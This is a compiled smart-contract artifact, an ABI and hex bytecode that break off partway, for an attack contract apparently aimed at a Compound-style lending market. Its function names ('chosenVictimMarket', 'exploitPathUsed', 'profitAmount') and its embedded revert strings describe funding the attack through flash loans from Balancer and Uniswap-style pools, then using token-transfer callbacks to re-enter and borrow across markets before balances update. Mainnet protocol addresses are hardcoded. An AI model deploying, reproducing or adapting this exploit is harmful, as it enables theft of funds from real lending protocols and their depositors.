{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"BALANCER_VAULT","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"ERC1820_REGISTRY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"SUSHISWAP_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"TARGET_MARKET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"UNISWAP_V2_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"chosenVictimMarket","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"chosenVictimUnderlying","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"exploitPathUsed","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"lastFailure","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"onTokenTransfer","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"onTransferReceived","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"nonpayable"},{"type":"function","name":"pancakeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"receiveFlashLoan","inputs":[{"name":"tokens","type":"address[]","internalType":"address[]"},{"name":"amounts","type":"uint256[]","internalType":"uint256[]"},{"name":"feeAmounts","type":"uint256[]","internalType":"uint256[]"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"targetComptroller","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"targetUnderlying","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"tokenFallback","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"tokensReceived","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052346100d857600280546001600160a01b031916735ee08f40b637417bcc9d2c51b62f4820ec9cf5d81790556001600160a01b0361003f610170565b1660018060a01b031960035416176003555f8060405160208101906329965a1d60e01b82523060248201527fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b6044820152306064820152606481526100a56084826100dc565b519082731820a4b7618bde71dce8cdc73aab6c95905fad245af1506100c8610113565b5060405161461590816102588239f35b5f80fd5b601f909101601f19168101906001600160401b038211908210176100ff57604052565b634e487b7160e01b5f52604160045260245ffd5b3d1561014c573d906001600160401b0382116100ff5760405191610141601f8201601f1916602001846100dc565b82523d5f602084013e565b606090565b908160209103126100d857516001600160a01b03811681036100d85790565b604051635fe3b56760e01b6020820190815260048252906101926024826100dc565b62013880905f8082518573b0f8fe96b4880adbdede0ddf446bd1e7ef122c4e86fa6101bb610113565b908061024b575b61022b5750905f928373b0f8fe96b4880adbdede0ddf446bd1e7ef122c4e81945193f16101ed610113565b90158015610220575b61021b5780516001600160a01b039161021791810160209081019101610151565b1690565b505f90565b5060208151106101f6565b80516001600160a01b039450610217935081016020908101925001610151565b506020815110156101c256fe60806040526004361015610026575b361561001e5761001c610f72565b005b61001c610f72565b5f3560e01c806223de291461018a578063013eb1771461018557806310d1e85c1461015857806331a38c89146101805780633c2448ed1461017b578063463defd1146101765780634934362414610171578063495c0f9b1461016c5780635ff972cc146101675780636de4d1eb1461016257806374bbd9ed1461015d578063848008121461015857806388a7ca5c1461015357806399d8fae31461014e578063a4c0ed3614610144578063bc16384614610149578063c0ee0b8a14610144578063c3a5a1541461013f578063c86bc7fd1461013a578063d78c428114610135578063eeb3b5e314610130578063f04f27071461012b5763fa0eea310361000e57610a31565b610940565b610824565b61077f565b610758565b61067e565b61056c565b6105b4565b61053e565b6104dc565b6102d5565b6104b4565b61048c565b61046f565b610441565b61041a565b6103f8565b6103e0565b6103bb565b610263565b6101dd565b6001600160a01b031690565b6001600160a01b038116036101ac57565b5f80fd5b9181601f840112156101ac578235916001600160401b0383116101ac57602083818601950101116101ac57565b346101ac5760c03660031901126101ac576101f960043561019b565b61020460243561019b565b61020f60443561019b565b6084356001600160401b0381116101ac5761022e9036906004016101b0565b505060a4356001600160401b0381116101ac5761024f9036906004016101b0565b505061001c610f72565b5f9103126101ac57565b346101ac575f3660031901126101ac576020604051731820a4b7618bde71dce8cdc73aab6c95905fad248152f35b9060806003198301126101ac576004356102aa8161019b565b916024359160443591606435906001600160401b0382116101ac576102d1916004016101b0565b9091565b346101ac576103786103526102e936610291565b5050600b54919390929091906103499061031561030e6001600160a01b03851661018f565b3314611083565b610339600361032a60085460ff9060181c1690565b61033381610d29565b146110c0565b6001600160a01b031630146110fc565b60a01c60ff1690565b156103b457505b610366600c54821461113b565b61037281600d5461117a565b9061255e565b60025461001c906001600160a01b031661039230826127e4565b906103a2600d5480931015611187565b600b546001600160a01b031690612711565b9050610359565b346101ac575f3660031901126101ac57602060ff60085460081c166040519015158152f35b346101ac575f3660031901126101ac5761001c610bb0565b346101ac575f3660031901126101ac57602060ff600854166040519015158152f35b346101ac575f3660031901126101ac575f546040516001600160a01b039091168152602090f35b346101ac575f3660031901126101ac57602060405173c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac8152f35b346101ac575f3660031901126101ac576020600154604051908152f35b346101ac575f3660031901126101ac576005546040516001600160a01b039091168152602090f35b346101ac575f3660031901126101ac576003546040516001600160a01b039091168152602090f35b346101ac5760803660031901126101ac576104f860043561019b565b61050360243561019b565b6064356001600160401b0381116101ac576105229036906004016101b0565b505061052c610f72565b604051632229f29760e21b8152602090f35b346101ac575f3660031901126101ac576020604051735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f8152f35b346101ac5760603660031901126101ac576004356105898161019b565b506044356001600160401b0381116101ac576105a99036906004016101b0565b90505061001c610f72565b346101ac575f3660031901126101ac57602060405173ba12222222228d8ba445958a75a0704d566bf2c88152f35b90600182811c92168015610610575b60208310146105fc57565b634e487b7160e01b5f52602260045260245ffd5b91607f16916105f1565b634e487b7160e01b5f52604160045260245ffd5b90601f801991011681019081106001600160401b0382111761064f57604052565b61061a565b602060409281835280519182918282860152018484015e5f828201840152601f01601f1916010190565b346101ac575f3660031901126101ac576040515f60075461069e816105e2565b808452906001811690811561073457506001146106d6575b6106d2836106c68185038261062e565b60405191829182610654565b0390f35b60075f9081527fa66cc928b5edb82af9bd49922954155ab7b0942694bea4ce44661d9a8736c688939250905b80821061071a575090915081016020016106c66106b6565b919260018160209254838588010152019101909291610702565b60ff191660208086019190915291151560051b840190910191506106c690506106b6565b346101ac575f3660031901126101ac5760206040515f5160206145c05f395f51905f528152f35b346101ac575f3660031901126101ac576040515f60065461079f816105e2565b808452906001811690811561073457506001146107c6576106d2836106c68185038261062e565b60065f9081527ff652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f939250905b80821061080a575090915081016020016106c66106b6565b9192600181602092548385880101520191019092916107f2565b346101ac575f3660031901126101ac576004546040516001600160a01b039091168152602090f35b6040519061085b60608361062e565b565b9061085b604051928361062e565b6001600160401b03811161064f5760051b60200190565b9080601f830112156101ac5781356108998161086b565b926108a7604051948561062e565b81845260208085019260051b8201019283116101ac57602001905b8282106108cf5750505090565b81358152602091820191016108c2565b6001600160401b03811161064f57601f01601f191660200190565b81601f820112156101ac57803590610911826108df565b9261091f604051948561062e565b828452602083830101116101ac57815f926020809301838601378301015290565b346101ac5760803660031901126101ac576004356001600160401b0381116101ac57366023820112156101ac5780600401359061097c8261086b565b9161098a604051938461062e565b8083526024602084019160051b830101913683116101ac57602401905b828210610a1757836024356001600160401b0381116101ac576109ce903690600401610882565b6044356001600160401b0381116101ac576109ed903690600401610882565b90606435926001600160401b0384116101ac57610a1161001c9436906004016108fa565b50610e6b565b602080918335610a268161019b565b8152019101906109a7565b346101ac575f3660031901126101ac576002546040516001600160a01b039091168152602090f35b818110610a64575050565b5f8155600101610a59565b90601f8111610a7c575050565b61085b915f52601f60205f20910160051c810190610a59565b90601f8211610aa2575050565b61085b9160075f5260205f20906020601f840160051c83019310610ace575b601f0160051c0190610a59565b9091508190610ac1565b9190601f8111610ae757505050565b61085b925f5260205f20906020601f840160051c83019310610ace57601f0160051c0190610a59565b610b25610b1e6006546105e2565b6006610a6f565b5f600655565b610b40610b396007546105e2565b6007610a6f565b5f600755565b60405190610b5560408361062e565b601782527f5441524745545f444953434f564552595f4641494c45440000000000000000006020830152565b60405190610b9060408361062e565b60118252701393d7d410551217d4d550d0d151511151607a1b6020830152565b610bc461010061ff00196008541617600855565b610bd360ff1960085416600855565b600480546001600160a01b0319169055600580546001600160a01b0319169055610bfb610b10565b610c03610b2b565b5f80546001600160a01b0319168155600155610c1d6111cb565b610c25611246565b6002546001600160a01b0316158015610cbe575b610cb357610c4561160a565b61085b57610c516118bb565b61085b57610c5d611980565b61085b57610c69611c79565b61085b57610c75611dfb565b61085b57610c81612016565b61085b57610c8d6121e2565b61085b57610c9c6007546105e2565b15610ca357565b61085b610cae610b81565b6113a4565b61085b610cae610b46565b50600354610cd4906001600160a01b031661018f565b15610c39565b15610ce157565b60405162461bcd60e51b815260206004820152600c60248201526b2727aa2fa120a620a721a2a960a11b6044820152606490fd5b634e487b7160e01b5f52602160045260245ffd5b60041115610d3357565b610d15565b15610d3f57565b60405162461bcd60e51b815260206004820152601060248201526f464c4153485f4e4f545f41435449564560801b6044820152606490fd5b15610d7e57565b60405162461bcd60e51b815260206004820152601060248201526f4241445f464c4153485f41525241595360801b6044820152606490fd5b634e487b7160e01b5f52603260045260245ffd5b805115610dd75760200190565b610db6565b805160031015610dd75760800190565b8051821015610dd75760209160051b010190565b15610e0757565b60405162461bcd60e51b815260206004820152601660248201527515539156141150d5115117d1931054d217d054d4d15560521b6044820152606490fd5b634e487b7160e01b5f52601160045260245ffd5b91908201809211610e6657565b610e45565b61085b92610f11610eeb610ede610f5694610e9b73ba12222222228d8ba445958a75a0704d566bf2c83314610cda565b610ebf6002610eb060085460ff9060181c1690565b610eb981610d29565b14610d38565b600181511480610f67575b80610f5c575b610ed990610d77565b610dca565b516001600160a01b031690565b600254610f00906001600160a01b031661018f565b6001600160a01b0390911614610e00565b610f2e610f1d84610dca565b51610f2783610dca565b519061255e565b600254610f4f90610f48906001600160a01b031694610dca565b5191610dca565b5190610e59565b906126c8565b508451600114610ed0565b506001875114610eca565b6002546001600160a01b03163314801590611073575b61085b57610fa664010000000064ff00000000196008541617600855565b60085460281c60ff1661085b57610fcf6501000000000065ff0000000000196008541617600855565b610fe160ff60381b1960085416600855565b60025461100290610ffd906001600160a01b03165b30906127e4565b600a55565b61100a61282c565b9091611014575050565b61105661085b92611039660100000000000066ff000000000000196008541617600855565b60018060a01b03166001600160601b0360a01b6004541617600455565b60018060a01b03166001600160601b0360a01b6005541617600555565b5060085460381c60ff1615610f88565b1561108a57565b60405162461bcd60e51b815260206004820152600e60248201526d2727aa2fa32620a9a42fa820a4a960911b6044820152606490fd5b156110c757565b60405162461bcd60e51b815260206004820152600d60248201526c56325f4e4f545f41435449564560981b6044820152606490fd5b1561110357565b60405162461bcd60e51b815260206004820152601060248201526f2120a22fa32620a9a42fa9a2a72222a960811b6044820152606490fd5b1561114257565b60405162461bcd60e51b815260206004820152601060248201526f10905117d1931054d217d05353d5539560821b6044820152606490fd5b91908203918211610e6657565b1561118e57565b60405162461bcd60e51b8152602060048201526015602482015274158c97d49154105657d25394d551919250d2515395605a1b6044820152606490fd5b600280546001600160a01b031916735ee08f40b637417bcc9d2c51b62f4820ec9cf5d81790556001600160a01b03611201612c04565b166001600160601b0360a01b6003541617600355565b3d15611241573d90611228826108df565b91611236604051938461062e565b82523d5f602084013e565b606090565b5f8060405160208101906329965a1d60e01b82523060248201527fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b60448201523060648201526064815261129b60848261062e565b519082731820a4b7618bde71dce8cdc73aab6c95905fad245af1506112be611217565b50565b9081516001600160401b03811161064f576112e8816112e16006546105e2565b6006610ad8565b602092601f821160011461132857611318929382915f9261131d575b50508160011b915f199060031b1c19161790565b600655565b015190505f80611304565b60065f52601f198216937ff652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f915f5b86811061138c5750836001959610611374575b505050811b01600655565b01515f1960f88460031b161c191690555f8080611369565b91926020600181928685015181550194019201611356565b908151806113b157509050565b6001600160401b03811161064f576113d3816113ce6007546105e2565b610a95565b602092601f821160011461140757611402929382915f9261131d5750508160011b915f199060031b1c19161790565b600755565b60075f52601f198216937fa66cc928b5edb82af9bd49922954155ab7b0942694bea4ce44661d9a8736c688915f5b86811061146b5750836001959610611453575b505050811b01600755565b01515f1960f88460031b161c191690555f8080611448565b91926020600181928685015181550194019201611435565b6040519061149260608361062e565b60248252630a082a8960e31b6040837f4e4f5f5441524745545f434f4c4c41544552414c5f464f525f52454445454d5f60208201520152565b906006811015610dd75760051b0190565b81810292918115918404141715610e6657565b81156114f9570490565b634e487b7160e01b5f52601260045260245ffd5b6040519061151c60808361062e565b605982527f65656d65725d2f746f74616c537570706c7920757064617465000000000000006060837f72656465656d28292d3e63616c6c6261636b2d3e63726f73732d6d61726b657460208201527f20626f72726f77206265666f7265206163636f756e74546f6b656e735b72656460408201520152565b604051906115a360408361062e565b601b82527f52454445454d5f5452414e534645525f4e4f5f43414c4c4241434b00000000006020830152565b604051906115de60408361062e565b601d82527f52454445454d5f43414c4c4241434b5f424f52524f575f4641494c45440000006020830152565b611612612d27565b61162161161d612ddc565b1590565b6117b35761162e30612ec6565b80156117a75761163e60c061085d565b906001825260096020830152600160408301526001606083015260016080830152600160a083015261167060c061085d565b60018152600a60208201526002604082015260046060820152600a6080820152606460a08201525f5b600681106116d457505050506116b560085460ff9060201c1690565b156116c9576116c5610cae6115cf565b5f90565b6116c5610cae611594565b6116fc6116eb6116e483876114cb565b51856114dc565b6116f583856114cb565b51906114ef565b801561179e576117399061171c67ffffffff000000001960085416600855565b611734600160381b60ff60381b196008541617600855565b612f49565b61174b60ff60381b1960085416600855565b1561179657600854602081901c60ff169081611788575b50611771576001905b01611699565b5050505061178561178061150d565b612fbb565b90565b60301c60ff1690505f611762565b60019061176b565b5060019061176b565b506116c5610cae611483565b6116c5610cae611483565b604051906117cd60808361062e565b605b82527f72726f7765725d2f746f74616c426f72726f77732075706461746500000000006060837f626f72726f7728292d3e63616c6c6261636b2d3e63726f73732d6d61726b657460208201527f20626f72726f77206265666f7265206163636f756e74426f72726f77735b626f60408201520152565b6040519061185460408361062e565b601b82527f424f52524f575f5452414e534645525f4e4f5f43414c4c4241434b00000000006020830152565b6040519061188f60408361062e565b601d82527f424f52524f575f43414c4c4241434b5f424f52524f575f4641494c45440000006020830152565b6118c3612da1565b6118cb612ddc565b1561190b576118d86130a6565b6119005760085460201c60ff16156118f5576116c5610cae611880565b6116c5610cae611845565b6117856117806117be565b6116c560405161191c60608261062e565b602481527f4e4f5f5441524745545f434f4c4c41544552414c5f464f525f424f52524f575f6020820152630a082a8960e31b60408201526113a4565b6040519061196760408361062e565b600a8252694e4f5f4d41524b45545360b01b6020830152565b61198861327a565b805115611a3e575f5b8151811015611a23576119a7610ede8284610dec565b6001600160a01b0381168015908115611a0c575b50611a035761161d6119d4916119cf612da1565b612e6d565b6119fb576119e06130a6565b6119ee576001905b01611991565b50506117856117806117be565b6001906119e8565b506001906119e8565b5f5160206145c05f395f51905f529150145f6119bb565b505060085460201c60ff16156118f5576116c5610cae611880565b506116c5610cae611958565b60031115610d3357565b60405190611a6360408361062e565b601c82527f4e4f5f56325f464c4153485f524f5554455f464f525f424f52524f57000000006020830152565b60405190611a9e60408361062e565b601c82527f4e4f5f56325f464c4153485f524f5554455f464f525f52454445454d000000006020830152565b906008811015610dd75760051b0190565b60405190611aea60a08361062e565b606c82526b72726f77732075706461746560a01b6080837f666c617368737761702d66756e64656420626f72726f7728292d3e63616c6c6260208201527f61636b2d3e63726f73732d6d61726b657420626f72726f77206265666f72652060408201527f6163636f756e74426f72726f77735b626f72726f7765725d2f746f74616c426f60608201520152565b60405190611b8660a08361062e565b606a825269706c792075706461746560b01b6080837f666c617368737761702d66756e6465642072656465656d28292d3e63616c6c6260208201527f61636b2d3e63726f73732d6d61726b657420626f72726f77206265666f72652060408201527f6163636f756e74546f6b656e735b72656465656d65725d2f746f74616c53757060608201520152565b60405190611c2060408361062e565b6016825275158c97d1931054d217d093d49493d5d7d1905253115160521b6020830152565b60405190611c5460408361062e565b6016825275158c97d1931054d217d4915111515357d1905253115160521b6020830152565b611c816133b0565b80516001600160a01b0316158015611def575b611dd957611ca361010061085d565b906002825260046020830152600a60408301526014606083015260326080830152606460a083015260c860c08301526103e860e08301525f604082019160208101915b60088110611d08575050505050611cfd6001611a4a565b6116c5610cae611c45565b611d1784516116f58388611aca565b80158015611dce575b611dc557611d90611d9591611d356001612dab565b8451600b80546001600160a01b0319166001600160a01b03909216919091179055611d82611d638751151590565b600b805460ff60a01b191691151560a01b60ff60a01b16919091179055565b611d8b81600c55565b6135d3565b600d55565b611d9d6135fb565b611dab576001905b01611ce6565b5050505050611dba6001611a4a565b611785611780611b77565b50600190611da5565b508451811015611d20565b50611de46001611a4a565b6116c5610cae611a8f565b50604081015115611c94565b5f611e046133b0565b80519091906001600160a01b0316158015611f39575b611f2257611e2961010061085d565b916002835260046020840152600a60408401526014606084015260326080840152606460a084015260c860c08401526103e860e084015281604082019160208101915b60088110611ea057505050509050611e846002611a4a565b8015611e9557611785610cae611c45565b611785610cae611c11565b611eaf84516116f58389611aca565b80158015611f17575b611f0e57611d90611ecd91611d356002612dab565b611ed56135fb565b611ee3576001905b01611e6c565b505050509050611ef36002611a4a565b15611f0357611785611780611b77565b611785611780611adb565b50600190611edd565b508451811015611eb8565b5050611f2e6002611a4a565b6116c5610cae611a54565b50604082015115611e1a565b60405190611f5460408361062e565b602082527f4e4f5f42414c414e4345525f4c49515549444954595f464f525f52454445454d6020830152565b60405190611f8f60a08361062e565b606682526575706461746560d01b6080837f666c6173682d66756e6465642072656465656d28292d3e63616c6c6261636b2d60208201527f3e63726f73732d6d61726b657420626f72726f77206265666f7265206163636f60408201527f756e74546f6b656e735b72656465656d65725d2f746f74616c537570706c792060608201520152565b60025461202b906001600160a01b031661275b565b80156121035761203c61010061085d565b6002815260046020820152600a60408201526014606082015260326080820152606460a082015260c860c08201526103e860e08201525f5b60088110612083575050505f90565b6120976120908284611aca565b51846114ef565b80156120fa5761161d6120b1916120ac612dbe565b613809565b6120f257600854602081901c60ff1690816120e4575b506120d6576001905b01612074565b505050611785611780611f80565b60301c60ff1690505f6120c7565b6001906120d0565b506001906120d0565b506116c5610cae611f45565b6040519061211e60408361062e565b602082527f4e4f5f42414c414e4345525f4c49515549444954595f464f525f424f52524f576020830152565b6040519061215960a08361062e565b6068825267732075706461746560c01b6080837f666c6173682d66756e64656420626f72726f7728292d3e63616c6c6261636b2d60208201527f3e63726f73732d6d61726b657420626f72726f77206265666f7265206163636f60408201527f756e74426f72726f77735b626f72726f7765725d2f746f74616c426f72726f7760608201520152565b6002546121f7906001600160a01b031661275b565b80156122c35761220861010061085d565b6002815260046020820152600a60408201526014606082015260326080820152606460a082015260c860c08201526103e860e08201525f5b6008811061224f575050505f90565b61225c6120908284611aca565b80156122ba5761161d612271916120ac612dd2565b6122b257600854602081901c60ff1690816122a4575b50612296576001905b01612240565b50505061178561178061214a565b60301c60ff1690505f612287565b600190612290565b50600190612290565b506116c5610cae61210f565b156122d657565b60405162461bcd60e51b815260206004820152601160248201527011931054d217d352539517d19052531151607a1b6044820152606490fd5b1561231657565b60405162461bcd60e51b8152602060048201526016602482015275232620a9a42fa922a222a2a6afa727afa1aa27a5a2a760511b6044820152606490fd5b1561235b57565b60405162461bcd60e51b815260206004820152601360248201527211931054d217d4915111515357d19052531151606a1b6044820152606490fd5b1561239d57565b60405162461bcd60e51b815260206004820152601b60248201527f52454445454d5f5452414e534645525f4e4f5f43414c4c4241434b00000000006044820152606490fd5b156123e957565b60405162461bcd60e51b815260206004820152601d60248201527f52454445454d5f43414c4c4241434b5f424f52524f575f4641494c45440000006044820152606490fd5b1561243557565b60405162461bcd60e51b815260206004820152601860248201527f464c4153485f52455041595f494e53554646494349454e5400000000000000006044820152606490fd5b1561248157565b60405162461bcd60e51b815260206004820152601a60248201527f464c4153485f5441524745545f424f52524f575f4641494c45440000000000006044820152606490fd5b156124cd57565b60405162461bcd60e51b815260206004820152601b60248201527f424f52524f575f5452414e534645525f4e4f5f43414c4c4241434b00000000006044820152606490fd5b1561251957565b60405162461bcd60e51b815260206004820152601d60248201527f424f52524f575f43414c4c4241434b5f424f52524f575f4641494c45440000006044820152606490fd5b61256f61256a826138e5565b6122cf565b60085460019060101c60ff1661258481611a4a565b1461263f5760085460029060101c60ff1661259e81611a4a565b146125d95760405162461bcd60e51b815260206004820152600e60248201526d09c9ebe8286a892ac8abea082a8960931b6044820152606490fd5b61263861085b926125f06125eb6130a6565b61247a565b61261d61261860085461260f61260a8260ff9060201c1690565b6124c6565b60301c60ff1690565b612512565b600254612632906001600160a01b0316610ff6565b92610e59565b111561242e565b61263861085b9261268d61267661265530612ec6565b61266081151561230f565b61171c67ffffffff000000001960085416600855565b61268860ff60381b1960085416600855565b612354565b6126b16126ac60085461260f6126a78260ff9060201c1690565b612396565b6123e2565b6002546126329030906001600160a01b03166127e4565b9061085b916040519163a9059cbb60e01b602084015273ba12222222228d8ba445958a75a0704d566bf2c8602484015260448301526044825261270c60648361062e565b613abf565b60405163a9059cbb60e01b60208201526001600160a01b03909216602483015260448083019390935291815261085b9161270c60648361062e565b908160209103126101ac575190565b6001600160a01b038116156127d4575f809160405160208101906370a0823160e01b825273ba12222222228d8ba445958a75a0704d566bf2c86024820152602481526127a860448261062e565b51915afa6127b4611217565b901580156127d9575b6127d457806020806117859351830101910161274c565b505f90565b5060208151106127bd565b906001600160a01b03821615612826575f91829160405160208101916370a0823160e01b835260018060a01b03166024820152602481526127a860448261062e565b50505f90565b61283461327a565b805115612a6d5761010061288561284a8261085d565b916001835260096020840152600160408401526001606084015260016080840152600160a0840152600160c0840152600160e084015261085d565b9060018252600a60208301526002604083015260046060830152600a6080830152601460a0830152603260c0830152606460e08301525f915b600283106128d257505050505f905f905f90565b909192938315945f5b8151811015612a5e576128f1610ede8284610dec565b6001600160a01b0381168015908115612a47575b50612a3e5761291381612a8b565b6001600160a01b0381168015612a0d578915612a185760025461293e906001600160a01b031661018f565b8114612a0d575b61294e83613b64565b908115612a015760025461296a906001600160a01b031661018f565b036129f157600a54905b5f5b6008811061298d5750505050506001905b016128db565b6129ae6129a461299d838d611aca565b51846114dc565b6116f5838c611aca565b80156129e8576129be9086613bb7565b6129cc576001905b01612976565b50509496509650965050506129e19150600955565b6001929190565b506001906129c6565b6129fb30836127e4565b90612974565b50505050600190612987565b505050600190612987565b600254612a2d906001600160a01b031661018f565b811461294557505050600190612987565b50600190612987565b5f5160206145c05f395f51905f529150145f612905565b509094509260010191906128be565b505f905f905f90565b908160209103126101ac57516117858161019b565b6001600160a01b038116908115612826575f5160206145c05f395f51905f528214612bea5773e853e5c1edf8c51e81bae81d742dd861df596de78214612bd05773f7548a6e9daf2e4689cedd8a08189d0d6f3ee91b8214612bb6576040519173104079a87ce46fe2cf27b811f6b406b69f6872b36020840191636f307dc360e01b835260048552612b1d60248661062e565b03612bac576207a120915b5f808551848487fa93612b39611217565b9480612ba0575b612b86575f94508493929184915193f1612b58611217565b90158015612b7b575b6127d45761018f8160208061178594518301019101612a76565b506020815110612b61565b5050505061018f8160208061178594518301019101612a76565b50602085511015612b40565b6201388091612b28565b505073a1e3f062ce5825c1e19207cd93cefdad82a8a63190565b505073f4edfad26ee0d23b69ca93112ecce52704e0006f90565b5050735ee08f40b637417bcc9d2c51b62f4820ec9cf5d890565b604051635fe3b56760e01b6020820190815260048252612c2560248361062e565b62013880905f808451835f5160206145c05f395f51905f5286fa92612c48611217565b9380612c8d575b612c74575f8094505f5160206145c05f395f51905f52819493925193f1612b58611217565b50505061018f8160208061178594518301019101612a76565b50602084511015612c4f565b6001600160a01b038116908115612826576040519173104079a87ce46fe2cf27b811f6b406b69f6872b36020840191635fe3b56760e01b835260048552612b1d60248661062e565b6003811015610d335762ff00006008549160101b169062ff0000191617600855565b6004811015610d335763ff0000006008549160181b169063ff000000191617600855565b612d316001612ce1565b612d3b6001612d03565b600480546001600160a01b03199081169091556005805490911690555f600955600254612d729030906001600160a01b03166127e4565b600a55600b80546001600160a81b03191690555f600c819055600d556008805467ffffffff0000000019169055565b612d316002612ce1565b612db490612ce1565b612d3b6003612d03565b612dc86001612ce1565b612d3b6002612d03565b612dc86002612ce1565b612df25f5160206145c05f395f51905f52612a8b565b6001600160a01b038116156127d457612e0c9030906127e4565b8015159081612e4e575b506116c557612e315f5160206145c05f395f51905f52613c25565b50612e49305f5160206145c05f395f51905f52612f11565b151590565b612e6691505f5160206145c05f395f51905f526139c4565b155f612e16565b612e7681612a8b565b6001600160a01b0381161561282657612e909030906127e4565b8015159081612eb4575b506127d45780612eac612e4992613c25565b503090612f11565b612ebf9150826139c4565b155f612e9a565b5f809160405160208101916370a0823160e01b835260018060a01b0316602482015260248152612ef760448261062e565b51905f5160206145c05f395f51905f525afa6127b4611217565b6040516370a0823160e01b602082019081526001600160a01b0390931660248083019190915281525f928392916127a860448261062e565b80156127d457611785906040519063db006a7560e01b6020830152602482015260248152612f7860448261062e565b5f5160206145c05f395f51905f52613d01565b60405190612f9a60408361062e565b60128252711393d7d49150531256915117d41493d1925560721b6020830152565b6005546001600160a01b03161561307357600554612fe1906001600160a01b0316610ff6565b90600954821115613066576005545f80546001600160a01b0319166001600160a01b0390921691909117905561302c9161302790613022906009549061117a565b600155565b6112c1565b61303e600160ff196008541617600855565b61304f62ff00001960085416600855565b61306163ff0000001960085416600855565b600190565b50506116c5610cae612f8b565b506116c560405161308560408261062e565b600f81526e2727afab24a1aa24a6afaa27a5a2a760891b60208201526113a4565b6130ae613b41565b80156127d457610100906130ff6130c48361085d565b926001845260096020850152600160408501526001606085015260016080850152600160a0850152600160c0850152600160e085015261085d565b60018152600a60208201526002604082015260046060820152600a6080820152601460a0820152603260c0820152606460e08201525f5b6008811061314657505050505f90565b6131606131566116e48387611aca565b6116f58385611aca565b80156131f45761319d9061318067ffffffff000000001960085416600855565b613198600160381b60ff60381b196008541617600855565b613b88565b6131af60ff60381b1960085416600855565b156131ec57600854602081901c60ff1690816131de575b506131d5576001905b01613136565b50505050600190565b60301c60ff1690505f6131c6565b6001906131cf565b506001906131cf565b6040805190919061320e838261062e565b6001815291601f1901366020840137565b6040519061322e60208361062e565b5f808352366020840137565b906132448261086b565b613251604051918261062e565b8281528092613262601f199161086b565b0190602036910137565b5f198114610e665760010190565b613282613dc2565b61328a613e36565b5f906132a161329c8251855190610e59565b61323a565b935f5b8251811015613306576132ba610ede8285610dec565b6132c861161d82878a613eec565b6132d6575b506001016132a4565b846132fa6132ff926132eb600195988b610dec565b6001600160a01b039091169052565b61326c565b93906132cd565b509290505f5b815181101561335a57613322610ede8284610dec565b61333061161d828689613eec565b61333e575b5060010161330c565b836132fa613353926132eb600195978a610dec565b9290613335565b50508252565b60405190606082018281106001600160401b0382111761064f576040525f6040838281528260208201520152565b906002811015610dd75760051b0190565b906005811015610dd75760051b0190565b6133b8613360565b9060406133c48161085d565b735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f81529073c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac602083015261340060a061085d565b73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2815291